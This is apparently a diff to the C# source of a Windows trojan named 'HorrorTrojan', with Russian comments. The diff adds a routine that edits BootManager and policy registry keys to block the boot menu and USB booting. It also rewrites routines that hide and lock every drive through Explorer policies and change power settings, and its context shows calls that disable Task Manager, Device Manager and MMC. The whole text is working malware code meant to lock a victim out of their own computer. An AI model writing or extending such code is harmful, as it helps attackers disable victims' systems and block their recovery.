@@ -25,6 +25,9 @@ namespace HorrorTrojan
             DisableDeviceManager();
             DisableMMC();
             DisableBIOSAccess();
+            
+            // ===== БЛОКИРОВКА ЗАГРУЗКИ С USB =====
+            DisableUSBboot();
         }
         
         private static void DisableTaskManager()
@@ -107,12 +110,12 @@ namespace HorrorTrojan
         }
 
         private static void DisableDrives()
-{
-    using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"))
-    {
-        key.SetValue("NoDrives", 0x03FFFFFF, RegistryValueKind.DWord);      // ← СКРЫВАЕТ ВСЕ ДИСКИ
-        key.SetValue("NoViewOnDrive", 0x03FFFFFF, RegistryValueKind.DWord); // ← ЗАПРЕЩАЕТ ПРОСМОТР
-    }
+        {
+            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"))
+            {
+                key.SetValue("NoDrives", 0x03FFFFFF, RegistryValueKind.DWord);
+                key.SetValue("NoViewOnDrive", 0x03FFFFFF, RegistryValueKind.DWord);
+            }
         }
 
         private static void DisableControlPanel()
@@ -146,12 +149,31 @@ namespace HorrorTrojan
         }
         
         private static void DisableBIOSAccess()
-{
-    using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\System"))
-        key.SetValue("EnableFirstLogonAnimation", 0, RegistryValueKind.DWord);
+        {
+            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\System"))
+                key.SetValue("EnableFirstLogonAnimation", 0, RegistryValueKind.DWord);
+                
+            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\Session Manager\Power"))
+                key.SetValue("HiberbootEnabled", 0, RegistryValueKind.DWord);
+        }
         
-    using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\Session Manager\Power"))
-        key.SetValue("HiberbootEnabled", 0, RegistryValueKind.DWord);  // ← НЕТ в старой!
+        // ===== БЛОКИРОВКА ЗАГРУЗКИ С USB =====
+        private static void DisableUSBboot()
+        {
+            try
+            {
+                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\BootManager"))
+                {
+                    key.SetValue("BootMenuPolicy", 1, RegistryValueKind.DWord);
+                    key.SetValue("DisplayBootMenu", 0, RegistryValueKind.DWord);
+                }
+                
+                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\System"))
+                {
+                    key.SetValue("EnableBootMenu", 0, RegistryValueKind.DWord);
+                }
+            }
+            catch { }
         }
     }
 }
